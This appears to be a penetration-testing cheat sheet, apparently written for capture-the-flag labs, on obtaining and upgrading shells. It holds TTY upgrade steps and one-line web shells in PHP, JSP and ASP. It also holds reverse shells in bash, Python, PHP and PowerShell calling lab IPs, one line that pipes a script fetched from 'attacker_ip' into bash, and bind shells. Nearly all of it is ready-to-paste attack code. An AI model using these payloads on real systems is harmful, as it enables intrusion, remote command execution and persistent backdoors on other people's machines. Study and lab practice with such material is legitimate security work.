---
icon: book-skull
description: Teletypewriters and Shells
---

# Shells/TTYs

{% hint style="info" %}
## <mark style="color:purple;">`TTYs`</mark>

### <mark style="color:purple;">Ncat</mark>

* <mark style="color:purple;">You can use the</mark> <mark style="color:orange;">**`rlwrap`**</mark> <mark style="color:purple;">utility to</mark> <mark style="color:purple;">enable line editing and history:</mark>

{% code title="Listener" %}
```bash
rlwrap nc -lvnp <port>
```
{% endcode %}

{% code title="Connect to the target" %}
```bash
rlwrap nc 10.10.10.131 6200
```
{% endcode %}

* <mark style="color:purple;">In order to have a full</mark> <mark style="color:orange;">**`TTY`**</mark> <mark style="color:purple;">**follow this steps:**</mark>

#### <mark style="color:orange;">`BASH`</mark><mark style="color:purple;">:</mark>

1. <mark style="color:red;">**`python3 -c 'import pty; pty.spawn("/bin/bash")'`**</mark>
2. &#x20;<mark style="color:red;">**`CTRL+Z`**</mark>
3. <mark style="color:red;">**`stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;`**</mark>

<mark style="color:orange;">**`ZSH`**</mark><mark style="color:purple;">:</mark>

* <mark style="color:purple;">Same first two steps and then:</mark>

{% code overflow="wrap" %}
```bash
stty raw -echo; fg %1; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
{% endcode %}
{% endhint %}

***

## <mark style="color:purple;">Shells</mark>

{% hint style="info" %}
## <mark style="color:purple;">Spawning Shells</mark>

{% code title="" %}
```sh
python3 -c 'import pty; pty.spawn("/bin/sh")' 
```
{% endcode %}

{% code title="" %}
```sh
script -qc /bin/bash /dev/null
```
{% endcode %}

{% code title="" %}
```sh
echo os.system('/bin/bash') 
```
{% endcode %}

{% code title="" %}
```sh
/bin/sh -i 
```
{% endcode %}

{% code title="" %}
```sh
/bin/bash -i
```
{% endcode %}

{% code title="" %}
```sh
perl -e 'exec "/bin/sh";'
```
{% endcode %}

{% code title="" %}
```sh
perl: exec "/bin/sh"; 
```
{% endcode %}

{% code title="" %}
```sh
ruby: exec "/bin/sh" 
```
{% endcode %}

{% code title="" %}
```sh
lua: os.execute('/bin/sh') 
```
{% endcode %}

{% code title="" %}
```sh
exec "/bin/sh"; 
```
{% endcode %}

```
// Some code
```

```
// Some code
```

```
// Some code
```

```
// Some code
```
{% endhint %}

***

{% hint style="info" %}
## <mark style="color:purple;">`PSY`</mark>

* <mark style="color:orange;">**`PSY`**</mark> <mark style="color:purple;">Shell is an interactive</mark> <mark style="color:orange;">**`PHP REPL (Read-Eval-Print Loop)`**</mark> <mark style="color:purple;">used normally for debugging.</mark>

***

### <mark style="color:purple;">Useful Commands:</mark>

{% code title="Very handy" %}
```sh
help
```
{% endcode %}

{% code title="Print the working directory" %}
```php
getcwd()
```
{% endcode %}

{% code title="Print the current user" %}
```php
get_current_user()
```
{% endcode %}

{% code title="Print system info" %}
```php
phpinfo()
```
{% endcode %}

{% code title="Print contents from directory" %}
```php
scandir("/home")
```
{% endcode %}

{% code title="Print content from file" %}
```php
file_get_contents("/etc/os-release")
```
{% endcode %}

* <mark style="color:purple;">If there are break line characters like</mark> <mark style="color:orange;">**`/n`**</mark> <mark style="color:purple;">and you want to get ride of then:</mark>

```php
echo file_get_contents("home/nairobi/ca.key")
```
{% endhint %}

***

{% hint style="warning" %}
## <mark style="color:purple;">Web Shells</mark>

### <mark style="color:purple;">Identify the</mark> <mark style="color:orange;">`Webroot`</mark>

{% code title="Apache" %}
```
/var/www/html
```
{% endcode %}

{% code title="Nginx" %}
```
/usr/local/nginx/html/
```
{% endcode %}

{% code title="IIS" %}
```
c:\inetpub\wwwroot\
```
{% endcode %}

{% code title="XAMPP" %}
```
C:\xampp\htdocs\
```
{% endcode %}

### <mark style="color:orange;">`PHP`</mark>

{% code title="Standard shell" %}
```php
<?php system($_REQUEST['cmd']); ?>
```
{% endcode %}

{% code title="Create cmd.php" %}
```bash
echo '<?php system($_REQUEST['cmd']); ?>' > cmd.php
```
{% endcode %}

***

### <mark style="color:orange;">`JSP (Java Server Pages)`</mark>

{% code title="Standard shell" overflow="wrap" %}
```java
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
{% endcode %}

***

### <mark style="color:orange;">`ASP (Active Server Pages)`</mark>

{% code title="Standar shell" %}
```aspnet
<% eval request("cmd") %>
```
{% endcode %}
{% endhint %}

***

{% hint style="danger" %}
## <mark style="color:purple;">Reverse Shells</mark>

### <mark style="color:orange;">`BASH`</mark> <mark style="color:purple;">Reverse Shells</mark>

{% code title="Standard Shell" %}
```bash
bash -i >& /dev/tcp/10.10.14.18/1337 0>&1
```
{% endcode %}

{% code title="Uses FIFO" overflow="wrap" %}
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
{% endcode %}

{% code title="Use the URL parameter" %}
```url
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.14/9001+0>%261'
```
{% endcode %}

***

### <mark style="color:green;">`Python`</mark> <mark style="color:purple;">Reverse Shells</mark>

#### <mark style="color:purple;">One liners</mark>

{% code title="Uses pty  " overflow="wrap" %}
```sh
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.6",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```
{% endcode %}

{% code title="Uses subprocess" overflow="wrap" %}
```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.157",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
{% endcode %}

#### <mark style="color:purple;">Create the shell file</mark>

{% code title="Uses pty " overflow="wrap" %}
```sh
echo 'import pty
import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.16.6", 4444))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn("/bin/bash")
s.close()' > shell.py
```
{% endcode %}

{% code title="Uses subprocess " overflow="wrap" %}
```bash
echo 'import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.157", 1235))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
subprocess.call(["/bin/sh", "-i"])
s.close()' > shell.py
```
{% endcode %}

***

### <mark style="color:orange;">`PHP`</mark> <mark style="color:purple;">Reverse shell:</mark>

{% code title="Direct reverse shell" overflow="wrap" %}
```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.17/4444 0>&1'");?>
```
{% endcode %}

* <mark style="color:purple;">**Fetches and executes a remote reverse shell via**</mark>**&#x20;**<mark style="color:orange;">**`curl`**</mark><mark style="color:purple;">**:**</mark>

```php
<?php system("curl http://attacker_ip/reverseshell | bash"); ?>
```

### <mark style="color:orange;">`Powershell`</mark> <mark style="color:purple;">Reverse shell:</mark>

{% code overflow="wrap" %}
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
{% endcode %}
{% endhint %}

***

{% hint style="info" %}
## <mark style="color:purple;">Bind Shells</mark>

* ### <mark style="color:purple;">First, find ports were</mark> <mark style="color:orange;">**`inbound`**</mark> <mark style="color:purple;">connections are allowed:</mark>
* ### <mark style="color:orange;">`Linux`</mark><mark style="color:purple;">:</mark>

```sh
ss -tuln
```

```bash
netstat -tuln
```

```sh
lsof -i -n
```

***

* ### <mark style="color:orange;">`Windows`</mark><mark style="color:purple;">:</mark>

```sh
netstat -ano | findstr "LISTEN"
```

{% code overflow="wrap" %}
```powershell
Get-Process | Where-Object {$_.Id -eq (Get-NetTCPConnection | Where-Object {$_.State -eq 'Listen'}).OwningProcess}
```
{% endcode %}

{% code title="Check firewall rules" %}
```sh
netsh advfirewall firewall show rule name=all
```
{% endcode %}

***

### <mark style="color:purple;">Shells</mark>

{% code overflow="wrap" %}
```sh
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
{% endcode %}

{% code title="Windows" overflow="wrap" %}
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```
{% endcode %}
{% endhint %}

\
Spawning Shells

```bash
exec "/bin/sh"                # (From within IRB) 
:!bash                        # (From within vi)
:set shell=/bin/bash:shell    # (From within vi) 
!sh                           # (From within nmap)
```

